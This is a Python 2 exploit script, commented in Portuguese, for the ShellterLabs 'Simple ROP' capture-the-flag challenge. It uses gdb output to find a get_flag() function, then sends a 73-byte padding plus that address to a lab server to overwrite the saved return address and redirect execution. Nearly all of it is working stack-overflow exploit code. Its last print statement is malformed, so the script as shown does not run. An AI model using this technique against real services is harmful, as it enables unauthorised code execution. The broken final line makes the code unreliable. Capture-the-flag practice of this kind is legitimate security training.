'''
Exploit para o desafio Simple ROP da ShellterLabs
-------------------------------------------------
O exploit causa um Buffer Overflow no programa 'corruptme_remote',
redirecionando o fluxo para a funcao get_flag(), que nao tem chamada
direta no codigo, revelando a flag.

gdb$ info functions
   ...
=> 0x0804853b  get_flag             ; funcao que precisamos executar
   0x080485a0  vulnerable_function
   ...
   0x080485da  main
   ...

Resumindo:
1. O programa aguarda uma entrada do usuario e a escreve em um buffer
2. devemos causar um buffer overflow no sistema para sobreescrever
   o endereco de retorno em EIP com o endereco da funcao get_flag()
3. Se tudo der certo, o programa retorna a flag :)


Ivan S. Vargas
22/11/2017
'''
import socket

SERVER = "lab.shellterlabs.com"
PORT = 33540

def exploit():
    add_get_flag = "\x3b\x85\x04\x08" #endereco da funcao: 0x0804853b
    payload = "A" * 73 + add_get_flag 

    print "[+] Conectando ao servidor"    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER, PORT))
    
    print "[+] Enviando payload..."
    sock.send(payload + "\n\r")
    r = sock.recv(1024)

    print "[*] Retorno: ", % r 


exploit()
